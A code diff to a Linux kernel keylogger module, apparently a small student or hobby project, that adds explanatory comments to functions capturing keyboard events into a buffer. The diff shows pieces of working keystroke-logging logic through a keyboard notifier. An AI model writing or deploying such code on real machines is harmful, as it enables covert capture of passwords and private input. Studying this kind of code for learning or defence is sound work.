@@ -6,6 +6,7 @@
 char keystrokes[BUFFER_SIZE];
 static char *pkeystrokes;
 
+// notifier block to register keystrokes
 struct notifier_block nb = {
 	.notifier_call = keylogger_notifier
 };
@@ -42,9 +43,9 @@ int init_keylogger(void) {
 	return 0;
 }
 
+// unregister the keyboard notifier
 void exit_keylogger(void) {
 	unregister_keyboard_notifier(&nb);
-	return;
 }
 
 // this will be called when there are new keyboard events
@@ -66,19 +67,22 @@ int keylogger_notifier(struct notifier_block *nb, unsigned long action, void *da
 static void add_keycode(int key_code) {
 	char ascii = '\0';
 
-	if (key_code >= FIRST_KEY_CODE && key_code <= LAST_KEY_CODE) {
+	if (key_code >= FIRST_KEY_CODE && key_code <= LAST_KEY_CODE) {	// if in table
 		ascii = character_table[key_code - FIRST_KEY_CODE];
-	} else if (key_code == SPACE_KEY_CODE) {
+	} else if (key_code == SPACE_KEY_CODE) {						// if space key
 		ascii = ' ';
 	}
 
+	// add to buffer, if there is memory in the buffer
 	if (ascii && pkeystrokes < keystrokes + sizeof(char)*BUFFER_SIZE) {
 		*(pkeystrokes++) = ascii;
 	}
 
+	// try to add key in case of a non ascii one
 	add_special_keycode(key_code);
 }
 
+// in case of a "non-ascii" key
 static void add_special_keycode(int key_code){
 	switch(key_code){
 		case 0xe:
